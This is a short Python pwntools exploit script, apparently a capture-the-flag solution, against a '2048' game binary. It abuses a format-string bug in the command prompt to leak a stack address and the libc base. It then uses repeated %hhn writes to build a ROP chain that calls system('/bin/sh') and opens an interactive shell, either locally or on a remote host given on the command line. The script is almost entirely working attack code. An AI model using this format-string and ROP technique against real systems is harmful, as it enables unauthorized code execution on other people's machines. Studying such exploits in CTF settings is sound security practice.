#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("2048-hacker-solvable-distr.out_patched")
libc = e.libc
gs = """
b *0x00000000004015cc
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

p.sendlineafter(
    b"Enter command(s) (w/a/s/d for movement, u to undo, q to quit): ", f"%p %27$p".encode())

p.recvuntil(b'Skipping turn. Invalid command\n')
_ = int(p.recvuntil(b' ').decode(), 0) + 0x21c8

libc.address = int(p.recvuntil(b'\n').decode(), 0) - \
    (libc.sym.__libc_start_call_main+128)

log.success(hex(libc.address))
one_gadget = libc.address + 0xebc88


def abw(addr, value):
    for i in range(6):

        if i:
            p.sendlineafter(
                b"Enter command(s) (w/a/s/d for movement, u to undo, q to quit): ", f"%{(addr+i) & 0xff}c%31$hhn".encode())

        else:

            p.sendlineafter(
                b"Enter command(s) (w/a/s/d for movement, u to undo, q to quit): ", f"%{(addr+i) & 0xffff}c%31$hn".encode())

        log.info(hex((value >> (8*i)) & 0xff))
        p.sendlineafter(
            b"Enter command(s) (w/a/s/d for movement, u to undo, q to quit): ", f"%{(value >> 8*i) & 0xff}c%61$hhn".encode())


abw(_, libc.address+0x000000000002a3e5)
abw(_+8, next(libc.search(b'/bin/sh')))
abw(_+0x10, libc.address+0x000000000002a3e6)
abw(_+0x18, libc.sym.system)

p.sendlineafter(
    b"Enter command(s) (w/a/s/d for movement, u to undo, q to quit): ", b'q')
p.interactive()
